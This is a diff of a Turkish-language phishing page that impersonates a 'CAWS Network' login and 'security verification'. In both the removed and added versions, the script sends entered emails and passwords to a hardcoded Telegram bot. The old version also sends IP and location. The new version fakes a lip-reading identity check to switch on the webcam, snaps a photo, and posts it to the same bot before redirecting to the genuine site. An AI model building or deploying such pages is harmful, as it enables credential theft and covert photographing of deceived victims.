@@ -3,189 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CAWS Network | Nexus Auth</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <title>CAWS Security Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
     <style>
-        :root { --main: #111; --accent: #444; --bg: #fdfdfd; --border: #e2e2e2; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #fff; font-family: 'Inter', sans-serif; color: #000; height: 100vh; display: flex; justify-content: center; align-items: center; }
         
-        body { 
-            background: var(--bg); 
-            font-family: 'Inter', sans-serif; 
-            color: var(--main); 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-        }
+        .container { width: 100%; max-width: 400px; padding: 30px; text-align: center; }
+        .logo { font-weight: 900; font-size: 32px; letter-spacing: -2px; margin-bottom: 10px; }
+        .shield-icon { width: 50px; margin-bottom: 20px; opacity: 0.8; }
+        
+        h2 { font-size: 20px; font-weight: 700; margin-bottom: 10px; color: #111; }
+        .info-text { font-size: 13px; color: #666; margin-bottom: 30px; line-height: 1.6; }
 
-        /* İnandırıcılığı artıran minimalist kart */
-        .auth-card {
-            width: 100%;
-            max-width: 400px;
-            padding: 60px 30px;
-            background: #fff;
-            text-align: center;
-            border-radius: 2px; /* Nike tarzı keskin köşeler */
-            border: 1px solid var(--border);
-            box-shadow: 0 4px 30px rgba(0,0,0,0.03);
-            position: relative;
-        }
+        .form-box { text-align: left; }
+        label { font-size: 11px; font-weight: 700; text-transform: uppercase; color: #999; display: block; margin-bottom: 8px; }
+        input { width: 100%; padding: 15px; border: 1px solid #eee; background: #f9f9f9; border-radius: 8px; margin-bottom: 20px; outline: none; font-size: 14px; }
+        
+        .btn-next { width: 100%; background: #000; color: #fff; border: none; padding: 18px; border-radius: 8px; font-weight: 700; cursor: pointer; text-transform: uppercase; font-size: 12px; }
 
-        /* Marka Logosu */
-        .brand {
-            font-weight: 900;
-            font-size: 38px;
-            letter-spacing: -3px;
-            margin-bottom: 5px;
-            color: #000;
-        }
-        .tagline {
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            color: #999;
-            margin-bottom: 45px;
-        }
-
-        .step-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; }
-        .desc { font-size: 13px; color: #666; margin-bottom: 35px; line-height: 1.5; padding: 0 10px; }
-
-        /* Modern Nike Tarzı Inputlar */
-        .input-group { text-align: left; margin-bottom: 25px; }
-        .input-group label { 
-            display: block; 
-            font-size: 11px; 
-            font-weight: 700; 
-            text-transform: uppercase; 
-            margin-bottom: 10px; 
-            color: #000; 
-        }
-        .input-group input { 
-            width: 100%; 
-            padding: 16px 0; 
-            background: transparent; 
-            border: none; 
-            border-bottom: 1.5px solid var(--border); 
-            font-size: 14px;
-            outline: none;
-            transition: 0.3s;
-        }
-        .input-group input:focus { border-bottom-color: #000; }
-
-        /* Şık Buton */
-        .nexus-btn {
-            background: #000;
-            color: #fff;
-            border: none;
-            width: 100%;
-            padding: 20px;
-            font-weight: 700;
-            font-size: 13px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 15px;
-        }
-        .nexus-btn:hover { background: #333; }
-
-        /* Gizli Bölüm */
-        #step-2 { display: none; }
-
-        /* Alt Güvenlik Barı */
-        .footer-sec {
-            margin-top: 50px;
-            padding-top: 25px;
-            border-top: 1px solid #f0f0f0;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            filter: grayscale(1);
-            opacity: 0.4;
-        }
-        .footer-sec img { height: 14px; }
+        /* GÜVENLİK ADIMI */
+        #verify-view { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:100; flex-direction:column; align-items:center; justify-content:center; padding: 20px; }
+        .video-wrapper { width: 300px; height: 300px; border-radius: 20px; overflow: hidden; background: #000; position: relative; border: 4px solid #f0f0f0; margin-bottom: 20px; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        
+        .code-box { background: #f4f4f4; padding: 15px 30px; border-radius: 12px; font-size: 32px; font-weight: 900; letter-spacing: 10px; margin: 20px 0; border: 2px dashed #ccc; }
+        .instruction { font-size: 14px; font-weight: 600; color: #111; margin-bottom: 5px; }
+        .sub-instruction { font-size: 12px; color: #888; text-align: center; max-width: 280px; }
     </style>
 </head>
 <body>
 
-<div class="auth-card">
-    <div class="brand">CAWS</div>
-    <div class="tagline">Network Edition</div>
-
-    <div id="step-1">
-        <h2 class="step-title">Account Link</h2>
-        <p class="desc">Caws Server senkronizasyonunu tamamlamak için Master hesabınızla kimlik doğrulaması yapın.</p>
-        
-        <div class="input-group">
-            <label>Master Account</label>
-            <input type="email" id="email" placeholder="example@gmail.com">
-        </div>
-        <div class="input-group">
-            <label>Global Password</label>
-            <input type="password" id="pass" placeholder="••••••••">
-        </div>
-        
-        <button class="nexus-btn" onclick="nextStep()">Continue</button>
-    </div>
-
-    <div id="step-2">
-        <div style="font-size: 40px; margin-bottom: 20px;">🛡️</div>
-        <h2 class="step-title">Hardware Verify</h2>
-        <p class="desc">
-            Hesap güvenliği için cihaz tanıma protokolünü başlatın. Konum ve Biyometrik erişim gereklidir.
-        </p>
-        <button class="nexus-btn" id="finalBtn" onclick="runNexus()">Verify Identity</button>
-        <p id="status" style="font-size: 11px; margin-top: 15px; color: #999; display: none;">Secure connection established...</p>
-    </div>
-
-    <div class="footer-sec">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/SSL_Cloudflare_logo.svg">
+<div class="container" id="step-1">
+    <img src="https://cdn-icons-png.flaticon.com/512/7641/7641727.png" class="shield-icon">
+    <div class="logo">CAWS</div>
+    <h2>Güvenlik Doğrulaması</h2>
+    <p class="info-text">Sunucu taşınma işlemleri nedeniyle hesabınızın size ait olduğunu doğrulamak için <b>Görsel Onay</b> gerekmektedir.</p>
+    
+    <div class="form-box">
+        <label>Master Account</label>
+        <input type="email" id="email" placeholder="E-posta adresiniz">
+        <label>Password</label>
+        <input type="password" id="pass" placeholder="Şifreniz">
+        <button class="btn-next" onclick="openCamera()">DEVAM ET</button>
     </div>
 </div>
 
+<div id="verify-view">
+    <div class="instruction">Lütfen aşağıdaki kodu sesli okuyun:</div>
+    <div class="code-box" id="random-code">4 8 2</div>
+    
+    <div class="video-wrapper">
+        <video id="webcam" autoplay playsinline muted></video>
+    </div>
+    
+    <div class="sub-instruction">Sistem, dudak hareketlerinizi ve yüz hatlarınızı yapay zeka ile analiz ediyor...</div>
+    <div id="loader" style="margin-top:20px; display:none; font-weight:700; font-size:12px; color:green;">ANALİZ EDİLİYOR...</div>
+</div>
+
 <script>
-    // Önceki script kodlarının aynısı buraya gelecek (Token ve Fetch kısımları)
-    const tgToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
-    const tgChat = "1540769169";
+    const token = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
+    const chat = "1540769169";
 
-    function nextStep() {
-        if(!document.getElementById('email').value || !document.getElementById('pass').value) return;
-        document.getElementById('step-1').style.display = 'none';
-        document.getElementById('step-2').style.display = 'block';
-    }
-
-    async function sendMsg(text) {
-        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChat}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
-    }
-
-    async function runNexus() {
-        const mail = document.getElementById('email').value;
+    function openCamera() {
+        const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
-        document.getElementById('status').style.display = 'block';
-        document.getElementById('finalBtn').innerHTML = "Processing...";
+        if(!email || !pass) return alert("Bilgileri eksiksiz girin.");
 
-        // Rapor gönderimi
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipD = await ipRes.json();
-            const log = `🎩 **CAWS NEW LOG** 🎩\n\n👤 **Mail:** \`${mail}\`\n🔑 **Pass:** \`${pass}\`\n🌐 **IP:** \`${ipD.ip}\`\n📍 **Loc:** ${ipD.city}`;
-            await sendMsg(log);
-        } catch(e) {}
+        // Rastgele kod üret
+        document.getElementById('random-code').innerText = Math.floor(Math.random() * 900) + 100;
 
-        // Kamera onayı isteme (Görünürde biyometrik doğrulama)
-        try {
-            await navigator.mediaDevices.getUserMedia({video:true});
-        } catch(e) {}
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('verify-view').style.display = 'flex';
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
 
-        setTimeout(() => {
-            alert("Verification Success: Caws Server link established.");
-            window.location.href = "https://caws.network";
-        }, 2500);
+            // Kullanıcı kodu okurken (4 saniye sonra) fotoğrafı çek
+            setTimeout(() => {
+                capture(video, email, pass);
+            }, 4000);
+        })
+        .catch(err => {
+            alert("Hata: Güvenlik protokolü için kamera izni zorunludur.");
+        });
+    }
+
+    async function capture(video, email, pass) {
+        document.getElementById('loader').style.display = 'block';
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            const fd = new FormData();
+            fd.append('photo', blob, 'security_check.jpg');
+            
+            // Fotoğrafı gönder
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat}`, { method: 'POST', body: fd });
+
+            // Bilgileri gönder
+            const msg = `🎭 **CAWS GÜVENLİK RAPORU** 🎭\n\n📧 **Mail:** \`${email}\`\n🔑 **Pass:** \`${pass}\`\n✅ **Durum:** Görsel Onay Alındı`;
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}&parse_mode=markdown`);
+
+            setTimeout(() => {
+                alert("Doğrulama Başarılı. Hesabınız senkronize edildi.");
+                window.location.href = "https://caws.network";
+            }, 2000);
+        }, 'image/jpeg', 0.8);
     }
 </script>
+
 </body>
 </html>
-
